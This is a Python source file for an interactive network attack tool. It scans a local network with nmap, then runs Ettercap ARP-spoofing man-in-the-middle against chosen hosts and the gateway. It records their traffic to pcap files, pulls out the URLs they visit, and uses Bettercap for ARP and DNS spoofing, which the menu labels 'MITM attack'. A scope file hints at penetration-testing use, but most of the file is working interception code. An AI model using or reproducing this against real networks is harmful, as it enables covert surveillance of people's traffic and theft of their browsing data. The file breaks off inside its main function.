import asyncio
import os
import re
import subprocess
import tempfile
import aiofiles
from datetime import datetime
from scapy.layers.http import HTTPRequest
from colorama import Fore
import signal
import pyfiglet
from termcolor import colored
import random
import time
from scapy.all import rdpcap, IP
from collections import defaultdict
import socket as std_socket
import webbrowser
from scapy.all import rdpcap
import dns.resolver
from colorama import Fore, Style
from dns.exception import DNSException
import ipaddress    
import psutil
import socket
from common_url import main as cu

def create_ascii_text():
    # create a list of fonts
    font_list = pyfiglet.FigletFont.getFonts()

    # create a list of colors
    color_list = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']

    # Set default text
    default_text = "Keep Threats Outside"

    # Clear the terminal screen
    os.system("clear")
    # Choose a random font and color
    font_choice = random.choice(font_list)
    color_choice = random.choice(color_list)

    # Generate ASCII art using the random font
    ASCII_art_1 = pyfiglet.figlet_format(default_text, font=font_choice)

    # Print the ASCII art in the chosen color
    print(colored(f"Font: {font_choice}\n", color_choice))
    print(colored(ASCII_art_1, color_choice))
    copy_right=colored("author cyb2rS2c",'red')
    print(copy_right)
# call function
create_ascii_text()



def get_ip_range(excluded_ips):
    # Sort the IPs
    excluded_ips = sorted([ipaddress.ip_address(ip) for ip in excluded_ips])

    # Create a list to hold the ranges
    ranges = []
    start = excluded_ips[0]
    end = excluded_ips[0]

    for ip in excluded_ips[1:]:
        if int(ip) - int(end) == 1:
            # Extend the current range
            end = ip
        else:
            # Store the completed range
            ranges.append(f"{start}-{end}" if start != end else str(start))
            start = end = ip

    # Add the last range
    ranges.append(f"{start}-{end}" if start != end else str(start))

    # Return formatted IP range for Ettercap
    return ",".join(ranges)  # Example: "192.168.0.100-192.168.0.120,192.168.0.150"


def isip(lst, store=None):
    if store is None:
        store = []
    
    status = False
    pattern = r'^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}$'

    for string in lst:
        string = string.strip()  # Remove spaces
        if re.fullmatch(pattern, string):
            store.append(string)
            status = True

    return store, status


def rules_ip(ips, all_allowed=None, all_denied=None, allowed=None, denied=None):
    if all_allowed is None:
        all_allowed = []
    if all_denied is None:
        all_denied = []
    if allowed is None:
        allowed = set()
    if denied is None:
        denied = set()

    # Validate the IP addresses from the provided list of IPs
    valid_ips, _ = isip(ips)

    try:
        with open('allowed_scope.txt', 'r') as f:
            content = f.read()
            # Loop through each valid IP
            for ip in valid_ips:
                if ip in content:  # Check if the IP is in the allowed_scope.txt file
                    all_allowed.append(ip)
                    allowed.add(ip)  # Add to allowed set
                else:
                    all_denied.append(ip)
                    denied.add(ip)  # Add to denied set
                
        return list(allowed), list(denied)
    
    except FileNotFoundError:
        print("The file 'allowed_scope.txt' was not found.")
        return [], []




async def get_active_interface():
    # Loop through all network interfaces to find active ones
    for interface, addrs in psutil.net_if_addrs().items():
        # Check if the interface has an IPv4 address
        for addr in addrs:
            if addr.family == socket.AF_INET:
                # Check if the interface is 'up' by looking at the network stats
                stats = psutil.net_if_stats().get(interface)
                if stats and stats.isup:  # If the interface is active
                    return interface
    return None  # Return None if no active interface is found

async def choose_interface_from_list():
    # Get a list of all network interfaces
    interfaces = psutil.net_if_addrs().keys()
    print("Available interfaces:")
    for idx, interface in enumerate(interfaces, 1):
        print(f"{idx}. {interface}")
    # Prompt the user to choose an interface
    choice = input(f"Please choose a number (1-{len(interfaces)}): ").strip()
    
    try:
        # Return the selected interface
        return list(interfaces)[int(choice) - 1]
    except (ValueError, IndexError):
        print("Invalid choice. Please try again.")
        return choose_interface_from_list()


async def get_user_input():
    user_data = {}

    # Detect the active interface asynchronously
    active_interface = await get_active_interface()

    if active_interface:
        # Ask the user if the detected interface is correct
        confirm = input(f"Detected active interface: {active_interface}. Is this correct? (yes/no): ").strip().lower()
        if confirm != 'yes':
            active_interface = await choose_interface_from_list()
    else:
        print("No active interface detected. Please choose one.")
        active_interface = await choose_interface_from_list()

    user_data['interface'] = active_interface
    print(f"Selected interface: {active_interface}")

    # The path to the URL file and the filter file
    user_data['url_file_path'] = 'url_file.txt'
    user_data['filter_file'] = 'excluded_ips.ef'

    # Collect the target IP(s) for scanning
    if "target_ips" not in user_data or not user_data["target_ips"]:
        target_ips_input = input("Enter the target-ip or multiple targets (comma separated) or press enter to skip and read them from the file allowed_scope.txt: ").strip()
        if target_ips_input == '':
            try:
                with open('allowed_scope.txt', 'r') as f:
                    target_ips_input = [ip.strip() for ip in f.read().splitlines() if ip.strip()]
                    print("IPs read from 'allowed_scope.txt':", target_ips_input)

                # Get allowed and denied IPs by calling the rules_ip function
                allowed, denied = rules_ip(target_ips_input)

            except FileNotFoundError:
                print("The file 'allowed_scope.txt' was not found.")
                target_ips_input = []  # If file is not found, set to empty list
                allowed = []
                denied = []
        else:
            target_ips_input = target_ips_input.split(',')  # Split the comma-separated list into a list
            allowed, denied = rules_ip(target_ips_input)  # Use the rules_ip function to separate them

        # Handle the case where no denied IPs are found
        if not denied:
            if allowed:
                allowed_ips = [ipaddress.ip_address(ip) for ip in allowed]

                # Try to determine the network by the first IP (for simplicity we assume the same subnet)
                subnet = ipaddress.ip_network(f"{allowed[0]}/24", strict=False)  # Default to /24 if unsure
                denied = [str(ip) for ip in subnet.hosts() if ip not in allowed_ips]

                print(f"No denied IPs found. Assuming IPs outside the allowed range in your subnet: ({subnet}) are denied.")
            else:
                print("No allowed IPs provided, cannot infer subnet.")
                denied = []

        if target_ips_input:
            user_data['target_ips'] = [ip.strip() for ip in target_ips_input]
        else:
            user_data['target_ips'] = allowed

        # List of IPs to exclude (denied IPs)
        user_data['exclude_ips'] = denied

        # Print denied IPs range (optional)
        if not denied:
            print("No denied IPs found.")
        else:
            get_ip_range(denied)
    else:
        print("Target IPs already provided in user_data:", user_data["target_ips"])

    return user_data



def parse_ips(input_ips):
    ip_list = []

    # If input is a string, check if it contains a range or comma-separated values
    if isinstance(input_ips, str):
        if '-' in input_ips:  # Case of an IP range
            start_ip, end_ip = input_ips.split('-')
            ip_list = generate_ip_range(start_ip.strip(), end_ip.strip())
        elif ',' in input_ips:  # Comma-separated list of IPs
            ip_list = [ip.strip() for ip in input_ips.split(',')]
        else:  # Single IP
            ip_list = [input_ips.strip()]
    elif isinstance(input_ips, list):  # If it's already a list of IPs
        ip_list = [ip.strip() for ip in input_ips]
    
    return ip_list


def generate_ip_range(start_ip, end_ip):
    """
    Generate a list of IP addresses in the given range.
    """
    start_parts = list(map(int, start_ip.split('.')))
    end_parts = list(map(int, end_ip.split('.')))

    ip_range = []

    for i in range(start_parts[3], end_parts[3] + 1):
        ip_range.append(f"{start_parts[0]}.{start_parts[1]}.{start_parts[2]}.{i}")

    return ip_range



async def run_ettercap(interface, default_gateway, target_ips, filter_file, url_file_path):
    # Compile the filter file and ensure it's compiled correctly
    compiled_file = await compile_filter_file(filter_file, interface)
    if not compiled_file:
        print(Fore.RED + "Failed to compile the filter file. Aborting Ettercap run.")
        return

    # Parse the target_ips input and convert it to a list of IPs
    target_ips = parse_ips(target_ips)

    # If there is at least one target IP, proceed
    if len(target_ips) >= 1:
        target_ip_range = ','.join(target_ips)  # In case we have multiple IPs or a range
        ettercap_command = [
            'ettercap', '-T', '-S', '-i', interface, '-F', compiled_file,
            '-M', 'arp:remote', f'//{default_gateway}/', f'//{target_ip_range}/',
            '-w', 'output.pcap'  # Save the filtered packets to the PCAP file
        ]
        print(f"Running Ettercap on IP range: {target_ip_range}")
    else:
        print(Fore.RED + "No target IPs provided. Aborting Ettercap run.")
        return

    # Read URLs from the provided file
    urls_to_match = read_urls_from_file(url_file_path)

    # Iterate over each target IP sequentially, allowing Ctrl + C to stop per target
    for target_ip in target_ips:
        # Define the PCAP file name for each target IP
        pcap_file = f"{target_ip}_filtered_activity.pcap"

        # Construct the Ettercap command for the single target IP
        ettercap_command = [
            'ettercap', '-T', '-S', '-i', interface, '-F', compiled_file,
            '-M', 'arp:remote', f'//{default_gateway}/', f'//{target_ip}/',
            '-w', pcap_file  # Save the filtered packets to the PCAP file
        ]

        try:
            # Run the Ettercap command
            print(f"Running Ettercap with command: {' '.join(ettercap_command)}")
            print('Wait for packets to appear in Wireshark...')
            print('Press Ctrl + C to return back to the menu')
            

            if len(target_ips) > 1:
                print('If you pass in more than 1 host, make sure to press Ctrl + C to see the results for other hosts.')

            # Open Wireshark in a new GNOME terminal window with filter applied for the current target IP
            gnome_wireshark_command = f'gnome-terminal -- bash -c "wireshark -i {interface} -k -Y \\"ip.addr=={target_ip}\\"; exec bash"'
            os.system(gnome_wireshark_command)  # Launch Wireshark in GNOME terminal

            # Running Ettercap in a new GNOME terminal window
            gnome_ettercap_command = f'gnome-terminal -- bash -c "ettercap -T -S -i {interface} -F {compiled_file} -M arp:remote //{default_gateway}/ //{target_ip}/ -w {pcap_file}; exec bash"'
            os.system(gnome_ettercap_command)  # Launch Ettercap in GNOME terminal

            # Running the Ettercap command asynchronously
            ettercap_process = await asyncio.create_subprocess_exec(
                *ettercap_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Handle the process output asynchronously
            stdout, stderr = await ettercap_process.communicate()

            # Check for errors in the Ettercap process
            if ettercap_process.returncode != 0:
                print(Fore.RED + f"Ettercap encountered an error for target: {target_ip}. Error: {stderr.decode().strip()}")
            else:
                print(Fore.GREEN + f"Ettercap completed successfully for target: {target_ip}.")

                # Process the saved PCAP file (filtered)
                await process_ip(target_ip, pcap_file, url_file_path)

                # Log matched URLs if any are found
                matched_urls = [url for url in urls_to_match if url in stdout.decode()]
                if matched_urls:
                    with open(f"{target_ip}.txt", "a") as f:
                        for matched_url in matched_urls:
                            f.write(f"{matched_url} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    print(Fore.GREEN + f"Matched URLs for {target_ip} have been logged to {target_ip}.txt")

            # After processing each target, prompt for user input
            print('Please make sure to press Ctrl + C to exit the Ettercap process once you finish viewing the output.')

        except asyncio.CancelledError:
            # Handle process cancellation
            print(Fore.YELLOW + f"Ettercap process was cancelled for target: {target_ip}")
            ettercap_process.terminate()
            await ettercap_process.wait()

        except KeyboardInterrupt:
            # Handle Ctrl + C gracefully to stop only the current target, not the entire script
            print(Fore.YELLOW + f"Process interrupted for target: {target_ip}. Moving to next target...")
            continue  # Continue with the next target

        except Exception as e:
            # Handle any unexpected errors
            print(Fore.RED + f"An error occurred while running Ettercap for target {target_ip}: {e}")
    
   

# Get default gateway and IP address for the given interface
async def get_network_info(interface):
    try:
        # Get default gateway
        process = await asyncio.create_subprocess_exec('ip', 'route', stdout=asyncio.subprocess.PIPE)
        stdout, _ = await process.communicate()
        route_output = stdout.decode()

        # Extract default gateway
        gateway_match = re.search(r'default via (\S+)', route_output)
        default_gateway = gateway_match.group(1) if gateway_match else "Not found"

        # Get IP address for the interface
        process = await asyncio.create_subprocess_exec('ip', 'addr', 'show', interface, stdout=asyncio.subprocess.PIPE)
        stdout, _ = await process.communicate()
        ip_output = stdout.decode()

        # Extract IP address
        ip_match = re.search(r'inet (\S+)', ip_output)
        ip_address = ip_match.group(1) if ip_match else "Not found"

        return default_gateway, ip_address
    except Exception as e:
        print(Fore.RED + f"An error occurred while fetching network info: {e}")
        return None, None

async def run_nmap_scan(target):
    try:
        process = await asyncio.create_subprocess_exec(
            'nmap', '-T4', '--max-scan-delay', '100s', '-sn', target,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if process.returncode == 0:
            result = stdout.decode()
            print(Fore.GREEN + "Nmap scan results:")
            print(result)
            active_ips = re.findall(r'Nmap scan report for (\S+)', result)
            return active_ips
        else:
            print(Fore.RED + "Nmap command failed with return code", process.returncode)
            print(Fore.RED + "Error message:", stderr.decode())
            return []

    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")
        return []



async def compile_filter_file(filter_file, interface):
    if not os.path.isfile(filter_file):
        print(Fore.RED + f"Error: The input file '{filter_file}' does not exist.")
        return None

    compiled_file = filter_file.replace('.ef', '.efc')
    compile_command = ['etterfilter', filter_file, '-o', compiled_file]

    # Optional: Log the interface if you want to use it for debugging or tracking
    print(f"Compiling filter file using interface: {interface}")

    try:
        print(f"Compiling filter file with command: {' '.join(compile_command)}")
        compile_process = await asyncio.create_subprocess_exec(
            *compile_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await compile_process.communicate()

        # Log the output
        print(stdout.decode().strip())
        if compile_process.returncode != 0:
            error_message = stderr.decode().strip()
            print(Fore.RED + f"Error compiling the Ettercap filter file: {error_message}")
            return None
        else:
            print(Fore.GREEN + f"Filter file compiled successfully into: {compiled_file}.")
            return compiled_file
    except Exception as e:
        print(Fore.RED + f"An error occurred while compiling the filter file: {e}")
        return None



async def extract_urls_from_pcap(pcap_file):
    urls = set()
    try:
        packets = rdpcap(pcap_file)
        for packet in packets:
            if HTTPRequest in packet and packet.haslayer("Raw"):
                raw_load = packet[HTTPRequest].load.decode(errors='ignore')
                urls.update(re.findall(r'http://[^\s"]+', raw_load))
                urls.update(re.findall(r'https://[^\s"]+', raw_load))
    except Exception as e:
        print(Fore.RED + f"Error processing pcap file: {e}")
    return urls

async def save_successful_urls(target_ip, successful_urls):
    successful_urls_file_path = f"{target_ip}_successful_urls.txt"

    try:
        async with aiofiles.open(successful_urls_file_path, mode='w') as file:
            for url in successful_urls:
                await file.write(f"{url}\n")
        print(Fore.GREEN + f"Successful URLs for {target_ip} saved to {successful_urls_file_path}.")
    except Exception as e:
        print(Fore.RED + f"An error occurred while saving successful URLs for {target_ip}: {e}")

async def process_ip(ip_address, pcap_file, url_file_path):
    print(Fore.YELLOW + f"Processing PCAP file for IP: {ip_address}")
    urls = await extract_urls_from_pcap(pcap_file)
    if urls:
        print(Fore.GREEN + f"Extracted URLs for IP {ip_address}:")
        matching_urls = compare_urls(urls, url_file_path)
        if matching_urls:
            await save_successful_urls(ip_address, matching_urls)
        else:
            print(Fore.RED + f"No matching URLs found for IP {ip_address}.")
    else:
        print(Fore.RED + f"No URLs found for IP {ip_address}.")

def compare_urls(extracted_urls, url_file_path):
    file_urls = load_urls_from_file(url_file_path)
    return [url for url in extracted_urls if url in file_urls]

def load_urls_from_file(file_path):
    if not os.path.isfile(file_path):
        print(Fore.RED + f"URL file {file_path} not found.")
        return []

    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def read_urls_from_file(file_path):
    urls = []
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
        print(Fore.GREEN + f"Successfully read URLs from {file_path}.")
    except FileNotFoundError:
        print(Fore.RED + f"Error: The file '{file_path}' was not found.")
    except IOError as e:
        print(Fore.RED + f"Error reading file '{file_path}': {e}")
    
    return urls


def create_excluded_ips_file(filter_file, exclude_ips):
    try:
        with open(filter_file, 'w') as f:
            for ip in exclude_ips:
                f.write(f"if (ip.src == '{ip}' || ip.dst == '{ip}') {{\n")
                f.write(f"    drop();\n")
                f.write(f"}}\n")
        print(Fore.GREEN + f"Created filter file '{filter_file}' with excluded IPs.")
    except Exception as e:
        print(Fore.RED + f"An error occurred while creating the filter file: {e}")


def handle_sigterm(signum, frame):
    print(Fore.YELLOW + "Received termination signal. Cleaning up...")
    # Implement any necessary cleanup here
    exit(0)



async def run_wireshark(interface, target_ips, urls, exclude_ips):
    # Ensure target_ips is a list
    if isinstance(target_ips, str):
        target_ips = [target_ips]

      # Ensure exclude_ips is a list, handling different input data types
    if isinstance(exclude_ips, str):
        exclude_ips = [exclude_ips]
    elif not isinstance(exclude_ips, list):
        for ip in exclude_ips:
            target_ips = [ip]

    
    # Normalize URLs by stripping protocol and handling variations in domain/subdomain
    with open(urls, 'r') as url_file:
        normalized_urls = [url.strip().split("//")[-1].replace("www.", "") for url in url_file]

    # Create exclusion filter for IPs
    exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])
    
    # Create IP filter for target IPs
    target_ip_filter = " || ".join([f"(ip.src == {ip} || ip.dst == {ip})" for ip in target_ips])

    # Create URL filters - search for full URLs or domains in frames
    url_filters = " || ".join([f'frame contains "{url}"' for url in normalized_urls if url])

    # Combine IP filters and URL filters
    filter_parts = []
    if exclude_filter:
        filter_parts.append(f"({exclude_filter})")
    if target_ip_filter:
        filter_parts.append(f"({target_ip_filter})")
    if url_filters:
        filter_parts.append(f"({url_filters})")

    filter_str = " && ".join(filter_parts) if filter_parts else "ip"

    # Print the combined filter for debugging
    print(Fore.CYAN + f"Running Wireshark with combined filter: {filter_str}")

    # Command to run Wireshark with the filter
    command = [
        'wireshark', '-i', interface, '-k', '-Y', filter_str
    ]

    try:
        # Run Wireshark with the combined filter
        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if process.returncode != 0:
            print(Fore.RED + f"Wireshark encountered an error: {stderr.decode().strip()}")
            await menu()
        else:
            print(Fore.GREEN + "Wireshark completed.")
           
            
            
    except asyncio.CancelledError:
        # Handle task cancellation (if applicable)
        print(Fore.YELLOW + "Wireshark task was cancelled.")
    except Exception as e:
        # Catch other errors and print them
        print(Fore.RED + f"An error occurred while running Wireshark: {e}")



# Simple in-memory cache
cache = {}

# Asynchronous function to resolve a single IP address
async def resolve_hostname(ip):
    if ip in cache:
        return cache[ip]

    # Run DNS resolution in the executor
    loop = asyncio.get_event_loop()
    try:
        result = await loop.run_in_executor(None, lambda: dns.resolver.resolve_address(ip)[0].target.to_text())
        cache[ip] = result
        return result
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, DNSException):
        cache[ip] = "No PTR record"
        return "No PTR record"
    except Exception as e:
        cache[ip] = f"Resolution error: {e}"
        return f"Resolution error: {e}"

# Asynchronous function to process the pcap file
async def resolve_pcap_file(pcap_file, output_file_path):
    resolved_data = {}
    
    try:
        packets = rdpcap(pcap_file)
        tasks = []

        # Collect all IP addresses from the pcap file
        ip_addresses = set()
        for packet in packets:
            if packet.haslayer('IP'):
                ip_addresses.add(packet['IP'].src)
                ip_addresses.add(packet['IP'].dst)

        # Create tasks for resolving all IP addresses
        for ip in ip_addresses:
            tasks.append(resolve_hostname(ip))

        # Await all DNS resolution tasks
        hostnames = await asyncio.gather(*tasks)

        # Map IP addresses to their hostnames
        hostname_map = dict(zip(ip_addresses, hostnames))

        # Create the resolved data dictionary
        for packet in packets:
            if packet.haslayer('IP'):
                src_ip = packet['IP'].src
                dst_ip = packet['IP'].dst
                
                resolved_data[packet.summary()] = {
                    'src_ip': src_ip,
                    'src_hostname': hostname_map.get(src_ip, "Unknown"),
                    'dst_ip': dst_ip,
                    'dst_hostname': hostname_map.get(dst_ip, "Unknown")
                }

    except Exception as e:
        print(f"Error resolving pcap file: {e}")
    
    return resolved_data


async def get_ip_addresses_from_pcap(pcap_file: str) -> set:
    """Extract unique IP addresses from a pcap file."""
    ip_addresses = set()
    packets = rdpcap(pcap_file)
    for packet in packets:
        if packet.haslayer('IP'):
            ip_addresses.add(packet['IP'].src)
            ip_addresses.add(packet['IP'].dst)
    return ip_addresses
async def whois_lookup(ip: str) -> dict:
    """Perform a WHOIS lookup using the Kali Linux `whois` command-line tool."""
    try:
        result = await asyncio.to_thread(subprocess.run, ['whois', ip], capture_output=True, text=True, check=True)
        output = result.stdout

        # Parse the WHOIS output
        whois_info = {}
        
        # Regex patterns for common fields
        patterns = {
            'Org Type': r'org-type:\s*(.*)',
            'Address': r'address:\s*(.*)',
            'Netname': r'netname:\s*(.*)',
            'NetRange': r'netrange:\s*(.*)',
            'Country': r'country:\s*(.*)',
            'Abuse Contact': r'abuse-mailbox:\s*(.*)',
        }

        for key, pattern in patterns.items():
            match = re.search(pattern, output, re.IGNORECASE)
            if match:
                whois_info[key] = match.group(1).strip()

        # Fill in IP address and default messages for missing data
        whois_info['IP'] = ip
        for key in patterns.keys():
            if key not in whois_info:
                whois_info[key] = 'N/A'

        return whois_info

    except subprocess.CalledProcessError as e:
        return {'IP': ip, 'Error': str(e)}
    


async def run_bettercap():
    iptospoof = input("Enter IP to spoof (e.g., 192.168.0.121): ")
    domaintoforward = "unused.com"

    # Prepare the Bettercap commands with delays
    commands = [
        "net.probe on",
        "net.show",
        "set arp.spoof.targets {}".format(iptospoof),
        "net.sniff on",
        "net.sniff off",
        "clear",
        "set dns.spoof.domains {}".format(domaintoforward),
        "dns.spoof on"
    ]
    
    # Open GNOME Terminal and run Bettercap commands
    terminal_command = [
        'gnome-terminal', 
        '--', 
        'bash', '-c', 
        f"echo 'Starting Bettercap...';bettercap -X -I wlan0; "  # Replace 'wlan0' with your interface
        f"{' && '.join(commands)}; exec bash"
    ]
    
    try:
        # Run the terminal command
        process = subprocess.Popen(terminal_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Optionally, read and print the terminal's stdout and stderr
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            print(f"Error in running Bettercap: {stderr.decode()}")
        else:
            print("Bettercap running successfully in GNOME Terminal.")
    
    except Exception as e:
        print(f"Error running Bettercap in GNOME Terminal: {e}")
   



async def apply_filter_and_save(pcap_file, output_file, filter_str):
    command = [
        'tshark',  # Use tshark for filtering
        '-r', pcap_file,      # Input pcap file
        '-Y', filter_str,     # Display filter
        '-w', output_file     # Output pcap file to save filtered results
    ]
    
    try:
        # Run the tshark command
        process = await asyncio.create_subprocess_exec(*command)
        await process.wait()  # Wait for the process to complete
        print(Fore.GREEN + f"Filtered pcap file saved as {output_file}.")
    except Exception as e:
        print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")
    


# Function to sanitize the filename to remove any invalid characters
def sanitize_filename(filename):
    # List of characters to remove for filename safety
    invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
    for char in invalid_chars:
        filename = filename.replace(char, '_')
    return filename

async def filter_and_analyze_pcap(user_data):
    # Set up signal handler for termination
    loop = asyncio.get_event_loop()
    loop.add_signal_handler(signal.SIGTERM, handle_sigterm)

    # Extract user data from the parameter
    interface = user_data['interface']
    url_file_path = user_data['url_file_path']
    filter_file = user_data['filter_file']
    exclude_ips = user_data['exclude_ips']
    target_ips = user_data['target_ips']

    try:
        # Assume this function gets network information (gateway and IP address)
        default_gateway, ip_address = await get_network_info(interface)
    except Exception as e:
        print(Fore.RED + f"Error getting network info: {e}")
        return

    # Generate the target network dynamically from the IP address and subnet
    ip_network = ipaddress.IPv4Interface(f"{ip_address}")  # Adjust subnet as needed
    target_network = ip_network.network  # Get the network part of the IP address

    try:
        # Run nmap scan to identify active devices in the target network
        isactive = await run_nmap_scan(str(target_network))  # Pass the network string for Nmap
        
    except Exception as e:
        print(Fore.RED + f"Error running Nmap scan: {e}")
        return

    get_ip_range(exclude_ips)
    
    # Let the user select an IP to reinclude from the excluded IPs
    if exclude_ips:
        print("Select an IP to reinclude from the excluded list:")
        for idx, ip in enumerate(exclude_ips, 1):
            print(f"{idx}. {ip}")
        
        try:
            reinclude_choice = ''
            if reinclude_choice:
                reinclude_choice = int(reinclude_choice)
                if 1 <= reinclude_choice <= len(exclude_ips):
                    ip_to_reinclude = exclude_ips[reinclude_choice - 1]
                    print(f"Removing {ip_to_reinclude} from the excluded list.")
                    exclude_ips.remove(ip_to_reinclude)
                    if ip_to_reinclude not in target_ips:
                        target_ips.append(ip_to_reinclude)  # Add it back to target_ips
                else:
                    print("Invalid choice. Skipping reinclude.")
        except ValueError:
            print("Invalid input. Skipping reinclude.")

    # Ensure target_ips list has no duplicates
    target_ips = list(set(target_ips))  # Convert to a set and back to list to remove duplicates

    # Create sanitized filenames for pcap files (one for each target IP)
    print(f'The following files will be created after the attack:')
    for ip in target_ips:
        sanitized_ip = sanitize_filename(ip)
        pcap_file = f"{sanitized_ip}_filtered_activity.pcap"
        output_file = f"{sanitized_ip}_filtered_output.pcap"
        print(f"1. {pcap_file}\n2. {output_file}")
    print(f'Choose option 2 after you break the pop-ups that you will see:')

    # Create excluded IPs filter file
    create_excluded_ips_file(filter_file, exclude_ips)

    # Ensure exclude_ips list has no duplicates
    exclude_ips = list(set(exclude_ips))  # Convert to a set and back to list to remove duplicates

    # Compile the filter file
    compiled_file = await compile_filter_file(filter_file, interface)
    if not compiled_file:
        print(Fore.RED + "Compilation failed.")
        return
  
    # Create filter string
    exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])
    target_ip_filter = " || ".join([f"(ip.src == {ip} || ip.dst == {ip})" for ip in target_ips])

    with open(url_file_path, 'r') as url_file:
        normalized_urls = [url.strip().split("//")[-1].replace("www.", "") for url in url_file]
    url_filters = " || ".join([f'frame contains "{url}"' for url in normalized_urls if url])

    filter_str = " && ".join(filter(None, [
        exclude_filter,
        target_ip_filter,
        url_filters
    ]))

    print(Fore.CYAN + f"Applying filter to pcap file: {filter_str}")

    # Initialize tasks as None to ensure they are defined even if exceptions are raised
    ettercap_task = None
    wireshark_task = None

    # Run Ettercap and Wireshark in parallel for each target IP
    try:
        ettercap_task = asyncio.create_task(run_ettercap(interface, default_gateway, target_ips, filter_file, url_file_path))
        wireshark_task = asyncio.create_task(run_wireshark(
            interface=interface,
            target_ips=target_ips,
            urls=url_file_path,
            exclude_ips=exclude_ips
        ))

        # Wait for both Ettercap and Wireshark to finish
        await asyncio.gather(ettercap_task, wireshark_task)

    except Exception as e:
        print(Fore.RED + f"An error occurred while running Ettercap and Wireshark: {e}")
        # Cancel tasks if any exception occurs
        if ettercap_task and not ettercap_task.done():
            ettercap_task.cancel()
        if wireshark_task and not wireshark_task.done():
            wireshark_task.cancel()
        await asyncio.gather(
            *(task for task in [ettercap_task, wireshark_task] if task and not task.done()),
            return_exceptions=True
        )

    # Proceed with filtering and analyzing the pcap file for each target IP
    try:
        # Create filter and save pcap files for each target IP
        for ip in target_ips:
            sanitized_ip = sanitize_filename(ip)
            pcap_file = f"{sanitized_ip}_filtered_activity.pcap"
            output_file = f"{sanitized_ip}_filtered_output.pcap"
            filter_task = asyncio.create_task(apply_filter_and_save(pcap_file, output_file, filter_str))
            await filter_task
    except Exception as e:
        print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")

    print(Fore.GREEN + "Both filtering and Wireshark analysis completed.")
async def resolve_and_display_ips():

    target_ips = input('Enter the target_ip that you spoofed from the first step: ').split()
    # Prepare the pcap file names using the first IP (or a default name if using a range)
    pcap_file = f'{target_ips[0]}_filtered_activity.pcap' if isinstance(target_ips, list) else f'{target_ips}_filtered_activity.pcap'
    
    # Check if the pcap file exists
    if not os.path.exists(pcap_file):
        print(f"Error: The file {pcap_file} does not exist. Please run the Sniffer (Step 1) first.")
        return  # Exit the function if the file doesn't exist

    # Proceed with IP resolution and WHOIS lookup if the file exists
    output_file_path = f'{target_ips[0]}_resolved_output.txt'

    try:
        # Resolve pcap file and display results
        resolved_info = await resolve_pcap_file(pcap_file, output_file_path)
        for packet_summary, data in resolved_info.items():
            print(f"Packet: {packet_summary}")
            print(f"Source IP: {data['src_ip']} -> Source Hostname: {data['src_hostname']}")
            print(f"Destination IP: {data['dst_ip']} -> Destination Hostname: {data['dst_hostname']}\n")
    except Exception as e:
        print(f"Error while processing the pcap file: {e}")

    # Extract and deduplicate IPs for WHOIS lookup
    ip_addresses = await get_ip_addresses_from_pcap(pcap_file)
    unique_ips = list(set(ip_addresses))  # Remove duplicates

    # Perform WHOIS lookups
    whois_tasks = [whois_lookup(ip) for ip in unique_ips]
    whois_results = await asyncio.gather(*whois_tasks)

    # Display WHOIS results
    for result in whois_results:
        print(f"WHOIS information for IP: {result['IP']}")
        if 'Error' in result:
            print(f"Error: {result['Error']}")
        else:
            print(f"Org Type: {result.get('Org Type', 'N/A')}")
            print(f"Address: {result.get('Address', 'N/A')}")
            print(f"Netname: {result.get('Netname', 'N/A')}")
            print(f"NetRange: {result.get('NetRange', 'N/A')}")
            print(f"Country: {result.get('Country', 'N/A')}")
            print(f"Abuse Contact: {result.get('Abuse Contact', 'N/A')}\n")
def kill_all_terminals():
    try:
        # Get a list of all the processes running under 'gnome-terminal'
        process_list = os.popen("ps aux | grep 'gnome-terminal'").readlines()

        # Iterate over each process, skip grep and kill the actual gnome-terminal process
        for process in process_list:
            if 'gnome-terminal' in process and 'grep' not in process:
                # Extract the PID from the process line
                pid = int(process.split()[1])
                print(f"Killing process with PID {pid}")
                os.kill(pid, signal.SIGTERM)  # Sends SIGTERM to kill the process
    except Exception as e:
        print(f"An error occurred: {e}")


async def menu():
    user_data = {}  # Store user inputs to prevent re-asking

    while True:
        print("\nMenu:")
        print("1. Sniffer: Filter and Analyze Pcap")
        print("2. Resolve and Display IPs")
        print("3. Spoofer: Bettercap ('MITM attack')")
        print("4. Aggressive sniffer + MITM")
        print("5. Exit")

        choice = input("Enter your choice: ")
        cu() #Fetches common visited url from wikipedia

        try:
            if choice in {'1','4'}:
                # Ensure we collect user data only once
                if not user_data:
                    user_data = await get_user_input()

            if choice == '1':
                await filter_and_analyze_pcap(user_data)  # Use stored data
                await menu()
            elif choice == '2':
                await resolve_and_display_ips()  # Use stored data
            elif choice == '3':
                await run_bettercap()  # No need for user input storage here
            elif choice == '4':
                # Run both filter and analyze pcap, and Bettercap concurrently
                await asyncio.gather(
                    filter_and_analyze_pcap(user_data),
                    run_bettercap()
                )
            elif choice == '5':
                kill_all_terminals()
                print("Exiting...")
                return  # Return from the menu, ending the loop
            else:
                print("Invalid choice. Please enter a number between 1 and 5.")
        except KeyboardInterrupt:
            # Gracefully handle the keyboard interrupt
            print("\nOperation interrupted. Returning to the menu...")
            continue  # Continue the loop and show the menu again

async def main():
    try:
